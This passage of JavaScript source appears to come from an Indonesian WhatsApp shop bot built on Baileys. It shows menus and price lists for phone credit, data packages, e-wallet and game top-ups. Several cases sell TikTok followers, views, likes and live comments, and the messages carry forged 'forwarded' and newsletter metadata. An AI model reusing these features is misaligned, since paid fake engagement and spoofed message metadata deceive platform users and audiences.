      								buttonParamsJson: `{"display_text":"Pulsa Tri","id":"${prefix}menupulsatri"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Pulsa b.yu","id":"${prefix}menupulsabyu"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Pulsa Telkomsel","id":"${prefix}menupulsatelkomsel"}`,
      							},
      							],
      						}
      						),
      						contextInfo: {
      							mentionedJid: [m.sender],
      							forwardingScore: 999,
      							isForwarded: true,
      							forwardedNewsletterMessageInfo: {
      								newsletterJid: "1203",
      								newsletterName: ownername,
      								serverMessageId: 143,
      							},
      						},
      					}),
      				},
      			},
      		},
      		{}
      		);

      	await kris.relayMessage(msg.key.remoteJid, msg.message, {
      		messageId: msg.key.id,
      	});
      }
      break;
      case "kuota3":
      {
      	if (cek("id", m.sender) == null)
      		return reply(
      			`Anda Belum Terdaftar di Database Silahkan ketik #daftar`
      			);

      	Anu = ` 🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*

      	> ╭─❏ *『 INFORMASI 』*
      	> ║ ➪ Name :  ${pushname}
      	> ║ ➪ Nomor : ${cek("id", m.sender).split("@")[0]}
      	> ║ ➪ Role : ${cek("role", m.sender)}
      	> ┗━━━━━━━━━━━━━━━━━━⬣
      	Berikut Menu Topup/Isi Ulang
      	> ┌──────⭓ *MENU TOPUP*
      	> │⭔ Berikut List Operator Paket Data
      	> └─────────────────────⭓
      	`;
      	let msg = generateWAMessageFromContent(
      		from,
      		{
      			viewOnceMessage: {
      				message: {
      					messageContextInfo: {
      						deviceListMetadata: {},
      						deviceListMetadataVersion: 2,
      					},
      					interactiveMessage: proto.Message.InteractiveMessage.create({
      						body: proto.Message.InteractiveMessage.Body.create({
      							text: Anu,
      						}),
      						footer: proto.Message.InteractiveMessage.Footer.create({
      							text: botname,
      						}),
      						header: proto.Message.InteractiveMessage.Header.create({
      							...(await prepareWAMessageMedia(
      								{ image: banner },
      								{ upload: kris.waUploadToServer }
      								)),
      							title: ``,
      							gifPlayback: true,
      							subtitle: ownername,
      							hasMediaAttachment: false,
      						}),
      						nativeFlowMessage:
      						proto.Message.InteractiveMessage.NativeFlowMessage.create(
      						{
      							buttons: [
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Paket Indosat","id":"${prefix}paketind"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Paket Smartfren","id":"${prefix}paketsmr"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Paket Axis","id":"${prefix}paketaxis"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Paket XL","id":"${prefix}paketxl"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Paket Tri","id":"${prefix}pakettri"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Paket b.yu","id":"${prefix}paketbyu"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Paket Telkomsel","id":"${prefix}pakettsel"}`,
      							},
      							],
      						}
      						),
      						contextInfo: {
      							mentionedJid: [m.sender],
      							forwardingScore: 999,
      							isForwarded: true,
      							forwardedNewsletterMessageInfo: {
      								newsletterJid: "1203",
      								newsletterName: ownername,
      								serverMessageId: 143,
      							},
      						},
      					}),
      				},
      			},
      		},
      		{}
      		);

      	await kris.relayMessage(msg.key.remoteJid, msg.message, {
      		messageId: msg.key.id,
      	});
      }
      break;
      case "topupemoney2":
      {
      	if (cek("id", m.sender) == null)
      		return reply(
      			`Anda Belum Terdaftar di Database Silahkan ketik #daftar`
      			);

      	Anu = 
      	`🗣️ : *Hay Kak ${pushname}, Jika Ada Bug Silahkan Lapor Ke Owner*\n\n` +
      	`> ╭─❏ *『 INFORMASI 』*\n` +
      	`> ║ ➪ Name: ${pushname}\n` +
      	`> ║ ➪ Nomor: ${cek("id", m.sender).split("@")[0]}\n` +
      	`> ║ ➪ Role: ${cek("role", m.sender)}\n` +
      	`> ┗━━━━━━━━━━━━━━━━━━⬣\n\n` +
      	`Berikut Menu Topup/Isi Ulang\n` +
      	`> ┌──────⭓ *MENU TOPUP*\n` +
      	`> │⭔ Berikut List TopUp Emoney (Dompet Digital)\n` +
      	`> └──────────────────⭓\n`;

      	let msg = generateWAMessageFromContent(
      		from,
      		{
      			viewOnceMessage: {
      				message: {
      					messageContextInfo: {
      						deviceListMetadata: {},
      						deviceListMetadataVersion: 2,
      					},
      					interactiveMessage: proto.Message.InteractiveMessage.create({
      						body: proto.Message.InteractiveMessage.Body.create({
      							text: Anu,
      						}),
      						footer: proto.Message.InteractiveMessage.Footer.create({
      							text: botname,
      						}),
      						header: proto.Message.InteractiveMessage.Header.create({
      							...(await prepareWAMessageMedia(
      								{ image: banner },
      								{ upload: kris.waUploadToServer }
      								)),
      							title: ``,
      							gifPlayback: true,
      							subtitle: ownername,
      							hasMediaAttachment: false,
      						}),
      						nativeFlowMessage:
      						proto.Message.InteractiveMessage.NativeFlowMessage.create(
      						{
      							buttons: [
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Topup Dana","id":"${prefix}dana"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Topup Gopay","id":"${prefix}gopay"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Topup Ovo","id":"${prefix}ovo"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Topup Shopee Pay","id":"${prefix}shopeepay"}`,
      							},
      							],
      						}
      						),
      						contextInfo: {
      							mentionedJid: [m.sender],
      							forwardingScore: 999,
      							isForwarded: true,
      							forwardedNewsletterMessageInfo: {
      								newsletterJid: "1203",
      								newsletterName: ownername,
      								serverMessageId: 143,
      							},
      						},
      					}),
      				},
      			},
      		},
      		{}
      		);

      	await kris.relayMessage(msg.key.remoteJid, msg.message, {
      		messageId: msg.key.id,
      	});
      }
      break;
      case "topupgames2":
      {
      	if (cek("id", m.sender) == null)
      		return reply(
      			`Anda Belum Terdaftar di Database Silahkan ketik #daftar`
      			);

      	Anu = ` 🗣️ : *Hay Kak ${pushname} Jika Ada Bug Silahkan Lapor Ke Owner*

      	> ╭─❏ *『 INFORMASI 』*
      	> ║ ➪ Name :  ${pushname}
      	> ║ ➪ Nomor : ${cek("id", m.sender).split("@")[0]}
      	> ║ ➪ Role : ${cek("role", m.sender)}
      	> ┗━━━━━━━━━━━━━━━━━━⬣
      	Berikut Menu Topup/Isi Ulang
      	> ┌──────⭓ *MENU TOPUP*
      	> │⭔ Berikut List TopUp Games
      	> └──────────────────⭓
      	`;
      	let msg = generateWAMessageFromContent(
      		from,
      		{
      			viewOnceMessage: {
      				message: {
      					messageContextInfo: {
      						deviceListMetadata: {},
      						deviceListMetadataVersion: 2,
      					},
      					interactiveMessage: proto.Message.InteractiveMessage.create({
      						body: proto.Message.InteractiveMessage.Body.create({
      							text: Anu,
      						}),
      						footer: proto.Message.InteractiveMessage.Footer.create({
      							text: botname,
      						}),
      						header: proto.Message.InteractiveMessage.Header.create({
      							...(await prepareWAMessageMedia(
      								{ image: banner },
      								{ upload: kris.waUploadToServer }
      								)),
      							title: ``,
      							gifPlayback: true,
      							subtitle: ownername,
      							hasMediaAttachment: false,
      						}),
      						nativeFlowMessage:
      						proto.Message.InteractiveMessage.NativeFlowMessage.create(
      						{
      							buttons: [
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Layanan FreeFire","id":"${prefix}ff"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Layanan Mobile Legends","id":"${prefix}ml"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Layanan Pubg","id":"${prefix}pubg"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Layanan Clash of Clans","id":"${prefix}coc"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Layanan Undawn","id":"${prefix}undawn"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Layanan Honor of Kings","id":"${prefix}hok"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Layanan Honor of Kings","id":"${prefix}hok"}`,
      							},
      							{
      								name: "quick_reply",
      								buttonParamsJson: `{"display_text":"Layanan Higgs Domino","id":"${prefix}higs"}`,
      							},
      							],
      						}
      						),
      						contextInfo: {
      							mentionedJid: [m.sender],
      							forwardingScore: 999,
      							isForwarded: true,
      							forwardedNewsletterMessageInfo: {
      								newsletterJid: "1203",
      								newsletterName: ownername,
      								serverMessageId: 143,
      							},
      						},
      					}),
      				},
      			},
      		},
      		{}
      		);

      	await kris.relayMessage(msg.key.remoteJid, msg.message, {
      		messageId: msg.key.id,
      	});
      }
      break;
      case "kuota2":
      {
      	if (cek("id", m.sender) == null)
      		return reply(
      			`Anda Belum Terdaftar di Database Silahkan ketik #daftar`
      			);

      	var slo = cek("saldo", m.sender);
      	var sto = 
      	`Halo Kak ${pushname}\n\n` +
      	`❍ Saldo: ${formatmoney(slo)}\n` +
      	`❍ Role: ${cek("role", m.sender)}\n` +
      	`-----------------------------------\n` +
      	`Silahkan pilih Menu yang Kak *${pushname}* inginkan, hanya tinggal copy dan paste pilihan topup yang telah disediakan\n` +
      	`-----------------------------------\n` +
      	`Silahkan Ketik:\n\n` +
      	`❍ paketind (Indosat)\n` +
      	`❍ paketsmr (Smartfren)\n` +
      	`❍ paketaxis (Axis)\n` +
      	`❍ paketxl (XL)\n` +
      	`❍ pakettri (Tri)\n` +
      	`❍ paketbyu (B.yu)\n` +
      	`❍ pakettsel (Telkomsel)\n\n` +
      	`_${toko}_\n`;

      	reply(sto);
      }
      break;
      case "pulsa2":
      {
      	if (cek("id", m.sender) == null)
      		return reply(
      			`Anda Belum Terdaftar di Database Silahkan ketik #daftar`
      			);

      	var slo = cek("saldo", m.sender);
      	var sto = 
      	`Halo Kak ${pushname}\n\n` +
      	`❍ Saldo: ${formatmoney(slo)}\n` +
      	`❍ Role: ${cek("role", m.sender)}\n` +
      	`-----------------------------------\n` +
      	`Silahkan pilih Menu yang kak *${pushname}* inginkan, hanya tinggal copy dan paste pilihan topup yang telah disediakan\n` +
      	`-----------------------------------\n` +
      	`Silahkan Ketik:\n\n` +
      	`❍ pulsaind (Indosat)\n` +
      	`❍ pulsasmr (Smartfren)\n` +
      	`❍ pulsaaxis (Axis)\n` +
      	`❍ pulsaxl (XL)\n` +
      	`❍ pulsatri (Tri)\n` +
      	`❍ pulsabyu (B.yu)\n` +
      	`❍ pulsatsel (Telkomsel)\n\n` +
      	`_${toko}_\n`;

      	reply(sto);
      }
      break;
      case "tiktok": {
      	let tamtiktok = 
      	`「 *LIST SOSMED TIKTOK* 」\n` +
      	`: ̗̀➛ tiktokview\n` +
      	`: ̗̀➛ tiktokfollowers5\n` +
      	`: ̗̀➛ tiktoklikes6\n` +
      	`: ̗̀➛ tiktokshare1\n` +
      	`: ̗̀➛ tiktokfollowersar3\n` +
      	`: ̗̀➛ tiktokfollowersexclusive1\n` +
      	`: ̗̀➛ tiktoksaveserver1\n` +
      	`: ̗̀➛ tiktoklivestreamviewsbonus\n` +
      	`: ̗̀➛ tiktoklivecomments1\n` +
      	`: ̗̀➛ tiktoklivestreams5\n` +
      	`: ̗̀➛ tiktoklivestreams2\n` +
      	`: ̗̀➛ tiktoklivestreams3\n` +
      	`: ̗̀➛ tiktoklivelike\n` +
      	`: ̗̀➛ tiktokcomments3\n` +
      	`: ̗̀➛ tiktoklivestreams1\n` +
      	`: ̗̀➛ tiktokstorylikes\n` +
      	`: ̗̀➛ tiktokfollowersindo\n`;

      	m.reply(tamtiktok);
      	break;
      }
      case "req":
      case "request":
      {
      	if (!text)
      		return m.reply(
      			`Jika Ada Produk Yang Ingin Ditambahkan\n\n` +
      			`Silahkan ketik:\n` +
      			`.Request NamaProduk\n\n` +
      			`Contoh:\n` +
      			`.Request Min Tolong Tambahin Game Freefire`
      			);

      	m.reply(`Sip, Saran Anda Telah Kami Terima`);
      	kris.sendMessage(nomorKu, {
      		text: `Saran: ${text}
      		Sender: wa.me/${sender.split("@")[0]}`,
      	});
      }
      break;
      case "tiktokfollowers":
      case "ttfl": {
      	const fs = require("fs");
      	let data10;
      	try {
      		data10 = JSON.parse(
      			fs.readFileSync("./Pengaturan/database/datasmm.json")
      			);
      	} catch (error) {
      		console.error("Gagal membaca file:", error);
      		return m.reply("Gagal membaca data. Silakan coba lagi nanti.");
      	}

      	let uphar = parseFloat(cek("upharga", m.sender)) / 100;
      	if (isNaN(uphar)) {
      		console.error("Nilai uphar tidak valid:", uphar);
      		return m.reply("Kesalahan dalam nilai upharga. Silakan coba lagi.");
      	}

      	let lev = `${cek("level", m.sender)}`;
      	data10.sort((a, b) => parseFloat(a.harga) - parseFloat(b.harga));

      	let listProduct10 = "「 *LIST TIKTOK FOLOWERS* 」\n";

      	data10.forEach(function (product) {
      		if (product.category === "[TK] Tiktok Followers") {
      			let harga = parseFloat(product.price);
            let hargaFinal = (harga + harga * uphar + 100).toFixed(0); // Hitung harga dengan persentase uphar dan tambahkan biaya tetap
            listProduct10 += `=> ${product.name}\n`;
            listProduct10 += `=> Level: ${lev}\n`;
            listProduct10 += `=> Harga: Rp ${hargaFinal}\n`;
            listProduct10 += `=> *Kode : ${product.id}*\n`;
            listProduct10 += `=> Min : ${product.min}\n`;
            listProduct10 += `=> Max : ${product.max}\n`;
            listProduct10 += `=> Catatan : ${product.note}\n`;
            listProduct10 += `=> Status : 🟢\n`;
            listProduct10 += `=> Kategori : ${product.category}\n`;
            listProduct10 += `=> Ketik : sosmed ${product.id}|Link/Username\n\n`;
        }
    });

      	m.reply(listProduct10);
      	break;
      }
      case "tiktokfollowersupdate": {
      	const fs = require("fs");
      	let data10;
      	try {
      		data10 = JSON.parse(
      			fs.readFileSync("./Pengaturan/database/datasmm.json")
      			);
      	} catch (error) {
      		console.error("Gagal membaca file:", error);
      		return m.reply("Gagal membaca data. Silakan coba lagi nanti.");
      	}

      	let uphar = parseFloat(cek("upharga", m.sender)) / 100;
      	if (isNaN(uphar)) {
      		console.error("Nilai uphar tidak valid:", uphar);
      		return m.reply("Kesalahan dalam nilai upharga. Silakan coba lagi.");
      	}

      	let lev = `${cek("level", m.sender)}`;
      	data10.sort((a, b) => parseFloat(a.harga) - parseFloat(b.harga));

      	let listProduct10 = "「 *LIST TIKTOK FOLOWERS UPDATE* 」\n";

      	data10.forEach(function (product) {
      		if (product.category === "[TK]TikTok Followers ᵁᴾᴰᴬᵀᴱᴰ") {
      			let harga = parseFloat(product.price);
            let hargaFinal = (harga + harga * uphar + 100).toFixed(0); // Hitung harga dengan persentase uphar dan tambahkan biaya tetap
            listProduct10 += `=> ${product.name}\n`;
            listProduct10 += `=> Level: ${lev}\n`;
            listProduct10 += `=> Harga: Rp ${hargaFinal}\n`;
            listProduct10 += `=> *Kode : ${product.id}*\n`;
            listProduct10 += `=> Min : ${product.min}\n`;
            listProduct10 += `=> Max : ${product.max}\n`;
            listProduct10 += `=> Catatan : ${product.note}\n`;
            listProduct10 += `=> Status : 🟢\n`;
            listProduct10 += `=> Kategori : ${product.category}\n`;
            listProduct10 += `=> Ketik : sosmed ${product.id}|Link/Username\n\n`;
        }
    });

      	m.reply(listProduct10);
      	break;
      }
      case "tiktokview2":
      case "ttview2": {
      	const fs = require("fs");
      	let data10;
      	try {
      		data10 = JSON.parse(
      			fs.readFileSync("./Pengaturan/database/datasmm2.json")
      			);
      	} catch (error) {
      		console.error("Gagal membaca file:", error);
      		return m.reply("Gagal membaca data. Silakan coba lagi nanti.");
      	}

      	let uphar = parseFloat(cek("harga", m.sender)) / 100;
      	if (isNaN(uphar)) {
      		console.error("Nilai uphar tidak valid:", uphar);
      		return m.reply("Kesalahan dalam nilai upharga. Silakan coba lagi.");
      	}

      	let lev = `${cek("role", m.sender)}`;
      	data10.sort((a, b) => parseFloat(a.harga) - parseFloat(b.harga));

      	let listProduct10 = "「 *LIST TIKTOK VIEW* 」\n";

      	data10.forEach(function (product) {
      		if (product.category === "Tiktok Views") {
      			let harga = parseFloat(product.price);
            let hargaFinal = (harga + harga * uphar + 100).toFixed(0); // Hitung harga dengan persentase uphar dan tambahkan biaya tetap
            listProduct10 += `=> ${product.name}\n`;
            listProduct10 += `=> Level: ${lev}\n`;
            listProduct10 += `=> Harga: Rp ${hargaFinal}\n`;
            listProduct10 += `=> *Kode : ${product.id}*\n`;
            listProduct10 += `=> Min : ${product.min}\n`;
            listProduct10 += `=> Max : ${product.max}\n`;
            listProduct10 += `=> Catatan : ${product.note}\n`;
            listProduct10 += `=> Status : 🟢\n`;
            listProduct10 += `=> Kategori : ${product.category}\n`;
            listProduct10 += `=> Ketik : sosmed ${product.id}|Link/Username\n\n`;
        }
    });

      	m.reply(listProduct10);
      	break;
      }

      case "ff":
      {
      	const kategori = "Games";
      	const brand = "FREE FIRE";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;
      case "memberff":
      {
      	const kategori = "Games";
      	const brand = "FREE FIRE";
      	const type = "Membership";
      	getList(kategori, brand, type);
      }
      break;
      case "pgr":
      {
      	const kategori = "Games";
      	const brand = "Punishing Gray Raven";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;
      case "aceracer":
      {
      	const kategori = "Games";
      	const brand = "Ace Racer";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;
      case "lol":
      {
      	const kategori = "Games";
      	const brand = "League of Legends Wild Rift";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;
      case "aov":
      {
      	const kategori = "Games";
      	const brand = "ARENA OF VALOR";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;
      case "higs":
      {
      	const kategori = "Games";
      	const brand = "Higgs Domino";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;
      case "wdp":
      {
      	const kategori = "Games";
      	const brand = "MOBILE LEGENDS";
      	const type = "Membership";
      	getList(kategori, brand, type);
      }
      break;
      case "coc":
      {
      	const kategori = "Games";
      	const brand = "Clash of Clans";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;
      case "hok":
      {
      	const kategori = "Games";
      	const brand = "Honor of Kings";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;
      case "cod":
      {
      	const kategori = "Games";
      	const brand = "Call of Duty MOBILE";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;
      case "valorant":
      {
      	const kategori = "Games";
      	const brand = "Valorant";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;
      case "metalslug":
      {
      	const kategori = "Games";
      	const brand = "Metal Slug Awakening";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;
      case "lita":
      {
      	const kategori = "Games";
      	const brand = "Lita";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;
      case "undawn":
      {
      	const kategori = "Games";
      	const brand = "Undawn";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;
      case "pubg":
      {
      	const kategori = "Games";
      	const brand = "PUBG MOBILE";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;
      case "ml":
      {
      	const kategori = "Games";
      	const brand = "MOBILE LEGENDS";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;

      case "ml":
      {
      	const kategori = "Games";
      	const brand = "MOBILE LEGENDS";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;
      case "memberml":
      {
      	const kategori = "Games";
      	const brand = "MOBILE LEGENDS";
      	const type = "Membership";
      	getList(kategori, brand, type);
      }
      break;

      
      case "dana":
      {
      	const kategori = "E-Money";
      	const brand = "DANA";
      	const type = "Umum";
      	getWallet(kategori, brand, type);
      }
      break;
      case "gopay":
      {
      	const kategori = "E-Money";
      	const brand = "GO PAY";
      	const type = "Customer";
      	getWallet(kategori, brand, type);
      }
      break;
      case "ovo":
      {
      	const kategori = "E-Money";
      	const brand = "OVO";
      	const type = "Umum";
      	getWallet(kategori, brand, type);
      }
      break;
      case "shopeepay":
      {
      	const kategori = "E-Money";
      	const brand = "SHOPEE PAY";
      	const type = "Umum";
      	getWallet(kategori, brand, type);
      }
      break;
      case "pln":
      {
      	const kategori = "PLN";
      	const brand = "PLN";
      	const type = "Umum";
      	getWallet(kategori, brand, type);
      }
      break;

      // Start Voucher

      case "vc-garena":
      {
      	const kategori = "Voucher";
      	const brand = "GARENA";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;

      // End Voucher 

      // ------------ Operator indosat ---------------

      case "pulsaind":
      {
      	const kategori = "Pulsa";
      	const brand = "INDOSAT";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;

      case "pulsaind-transfer":
      {
      	const kategori = "Pulsa";
      	const brand = "INDOSAT";
      	const type = "Pulsa Transfer";
      	getList(kategori, brand, type);
      }
      break;

      case "pulsaind-mix":
      {
      	const kategori = "Pulsa";
      	const brand = "INDOSAT";
      	const type = "Mix";
      	getList(kategori, brand, type);
      }
      break;

      case "pulsaind-gift":
      {
      	const kategori = "Pulsa";
      	const brand = "INDOSAT";
      	const type = "Pulsa Gift";
      	getList(kategori, brand, type);
      }
      break;

      case "pulsaind-reguler-combo":
      {
      	const kategori = "Pulsa";
      	const brand = "INDOSAT";
      	const type = "Pulsa Reguler Combo";
      	getList(kategori, brand, type);
      }
      break;

      case "pulsaind-combo-data":
      {
      	const kategori = "Pulsa";
      	const brand = "INDOSAT";
      	const type = "Combo Data";
      	getList(kategori, brand, type);
      }
      break;

      case "paketind":
      {
      	const kategori = "Data";
      	const brand = "INDOSAT";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;
      
      case "yellow-gift":
      {
      	const kategori = "Data";
      	const brand = "INDOSAT";
      	const type = "Yellow Gift";
      	getList(kategori, brand, type);
      }
      break;

      case "yellow-ind":
      {
      	const kategori = "Data";
      	const brand = "INDOSAT";
      	const type = "Yellow";
      	getList(kategori, brand, type);
      }
      break;

      case "giftdata":
      {
      	const kategori = "Data";
      	const brand = "INDOSAT";
      	const type = "Gift Data";
      	getList(kategori, brand, type);
      }
      break;

      case "freedom-harian":
      {
      	const kategori = "Data";
      	const brand = "INDOSAT";
      	const type = "Freedom Harian";
      	getList(kategori, brand, type);
      }
      break;
      
      case "freedom-u":
      {
      	const kategori = "Data";
      	const brand = "INDOSAT";
      	const type = "Freedom U";
      	getList(kategori, brand, type);
      }
      break;

      case "freedom-longlife":
      {
      	const kategori = "Data";
      	const brand = "INDOSAT";
      	const type = "Freedom Longlife";
      	getList(kategori, brand, type);
      }
      break;

      case "ind-umkm":
      {
      	const kategori = "Data";
      	const brand = "INDOSAT";
      	const type = "Freedom U";
      	getList(kategori, brand, type);
      }
      break;

      case "freedom-u-gift":
      {
      	const kategori = "Data";
      	const brand = "INDOSAT";
      	const type = "Freedom U Gift";
      	getList(kategori, brand, type);
      }
      break;

      case "freedom-internet-gift":
      {
      	const kategori = "Data";
      	const brand = "INDOSAT";
      	const type = "Freedom Internet Gift";
      	getList(kategori, brand, type);
      }
      break;

      case "freedom-internet":
      {
      	const kategori = "Data";
      	const brand = "INDOSAT";
      	const type = "Freedom Internet";
      	getList(kategori, brand, type);
      }
      break;

      // --------------------End Indosat ----------------------



      // ------------------- Operator  Telkomsel ---------------
      case "pulsatsel-umum":
      {
      	const kategori = "Pulsa";
      	const brand = "TELKOMSEL";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;

      case "pulsatsel-transfer":
      {
      	const kategori = "Pulsa";
      	const brand = "TELKOMSEL";
      	const type = "Pulsa Transfer";
      	getList(kategori, brand, type);
      }
      break;

      case "pulsatsel-mix":
      {
      	const kategori = "Pulsa";
      	const brand = "TELKOMSEL";
      	const type = "Mix";
      	getList(kategori, brand, type);
      }
      break;

      case "pakettsel":
      {
      	const kategori = "Data";
      	const brand = "TELKOMSEL";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;

      case "pakettsel-bulk":
      {
      	const kategori = "Data";
      	const brand = "TELKOMSEL";
      	const type = "Bulk";
      	getList(kategori, brand, type);
      }
      break;

      case "pakettsel-flash":
      {
      	const kategori = "Data";
      	const brand = "TELKOMSEL";
      	const type = "Flash";
      	getList(kategori, brand, type);
      }
      break;

      case "pakettsel-mini":
      {
      	const kategori = "Data";
      	const brand = "TELKOMSEL";
      	const type = "Mini";
      	getList(kategori, brand, type);
      }
      break;

      case "pakettsel-combo-sakti":
      {
      	const kategori = "Data";
      	const brand = "TELKOMSEL";
      	const type = "Combo Sakti";
      	getList(kategori, brand, type);
      }
      break;

      case "pakettsel-whatsapp":
      {
      	const kategori = "Data";
      	const brand = "TELKOMSEL";
      	const type = "Whatsapp";
      	getList(kategori, brand, type);
      }
      break;

      case "pakettsel-youtube":
      {
      	const kategori = "Data";
      	const brand = "TELKOMSEL";
      	const type = "Youtube";
      	getList(kategori, brand, type);
      }
      break;

      case "pakettsel-instagram":
      {
      	const kategori = "Data";
      	const brand = "TELKOMSEL";
      	const type = "Instagram";
      	getList(kategori, brand, type);
      }
      break;

      // -----------------------  End Telkomsel ----------------


      // ------------------- Pulsa Smartfren --------------
      case "pulsasmr":
      {
      	const kategori = "Pulsa";
      	const brand = "SMARTFREN";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;

      case "smartfren-transfer":
      {
      	const kategori = "Pulsa";
      	const brand = "SMARTFREN";
      	const type = "Pulsa Transfer";
      	getList(kategori, brand, type);
      }
      break;

      // --------------------- End Smartfren -------------



      // ---------------------- Operator Axis ------------------


      case "pulsaaxis-umum":
      {
      	const kategori = "Pulsa";
      	const brand = "AXIS";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;

      case "pulsaaxis-transfer":
      {
      	const kategori = "Pulsa";
      	const brand = "Axis";
      	const type = "Pulsa Transfer";
      	getList(kategori, brand, type);
      }
      break;

      case "pulsaaxis-mix":
      {
      	const kategori = "Pulsa";
      	const brand = "Axis";
      	const type = "Mix";
      	getList(kategori, brand, type);
      }
      break;

      case "umumaxis":
      {
      	const kategori = "Data";
      	const brand = "AXIS";
      	const type = "Umum";
      	getPaket(kategori, brand, type);
      }
      break;
      case "miniaxis":
      {
      	const kategori = "Data";
      	const brand = "AXIS";
      	const type = "Mini";
      	getPaket(kategori, brand, type);
      }
      break;
      case "kzlaxis":
      {
      	const kategori = "Data";
      	const brand = "AXIS";
      	const type = "Kzl";
      	getPaket(kategori, brand, type);
      }
      break;
      case "bronetaxis":
      {
      	const kategori = "Data";
      	const brand = "AXIS";
      	const type = "Bronet";
      	getPaket(kategori, brand, type);
      }
      break;
      case "owsemaxis":
      {
      	const kategori = "Data";
      	const brand = "AXIS";
      	const type = "Owsem";
      	getPaket(kategori, brand, type);
      }
      break;
      case "ekstraaxis":
      {
      	const kategori = "Data";
      	const brand = "AXIS";
      	const type = "Ekstra";
      	getPaket(kategori, brand, type);
      }
      break;
      case "sosmedaxis":
      {
      	const kategori = "Data";
      	const brand = "AXIS";
      	const type = "Sosmed";
      	getPaket(kategori, brand, type);
      }
      break;
      case "warnetaxis":
      {
      	const kategori = "Data";
      	const brand = "AXIS";
      	const type = "Paket Warnet";
      	getPaket(kategori, brand, type);
      }
      break;
      case "gameaxis":
      {
      	const kategori = "Data";
      	const brand = "AXIS";
      	const type = "Games";
      	getPaket(kategori, brand, type);
      }
      break;

      // --------------------- End Axis ----------------------

      // --------------------- Operator XL -------------------
      case "pulsaxl":
      {
      	const kategori = "Pulsa";
      	const brand = "XL";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;

      case "pulsaxl-transfer":
      {
      	const kategori = "Pulsa";
      	const brand = "XL";
      	const type = "Pulsa Transfer";
      	getList(kategori, brand, type);
      }
      break;

      case "pulsaxl-mix":
      {
      	const kategori = "Pulsa";
      	const brand = "XL";
      	const type = "Mix";
      	getList(kategori, brand, type);
      }
      break;

      // ------------------------End  XL -----------------


      // ------------------ Operator Smartfren -------------- 

      case "pulsasmr":
      {
      	const kategori = "Pulsa";
      	const brand = "SMARTFREN";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;

      case "pulsasmr-transfer":
      {
      	const kategori = "Pulsa";
      	const brand = "SMARTFREN";
      	const type = "Pulsa Transfer";
      	getList(kategori, brand, type);
      }
      break;

      case "paketsmr":
      {
      	const kategori = "Data";
      	const brand = "SMARTFREN";
      	const type = "Umum";
      	getList(kategori, brand, type);
      }
      break;

      case "smartfren-unlimited":
      {
      	const kategori = "Data";
      	const brand = "SMARTFREN";
      	const type = "Unlimited";
      	getList(kategori, brand, type);
      }
      break;

      case "smartfren-volume":
      {
      	const kategori = "Data";
      	const brand = "SMARTFREN";
      	const type = "Volume";
      	getList(kategori, brand, type);
      }
      break;

      case "smartfren-youtube":
      {
      	const kategori = "Data";
      	const brand = "SMARTFREN";
      	const type = "Youtube";
      	getList(kategori, brand, type);
      }
      break;

      case "smartfren-connex":
      {
      	const kategori = "Data";
      	const brand = "SMARTFREN";
      	const type = "Connex Evo";
      	getList(kategori, brand, type);
      }
      break;

      case "smartfren-gokil-max":
      {
      	const kategori = "Data";
      	const brand = "SMARTFREN";
      	const type = "Gokil Max";
      	getList(kategori, brand, type);
      }
      break;

      case "smartfren-gokil-combo":
      {
      	const kategori = "Data";
      	const brand = "SMARTFREN";
      	const type = "Gokil Combo";
      	getList(kategori, brand, type);
      }
      break;

      case "smartfren-nonstop":
      {
      	const kategori = "Data";
      	const brand = "SMARTFREN";
      	const type = "Nonstop";
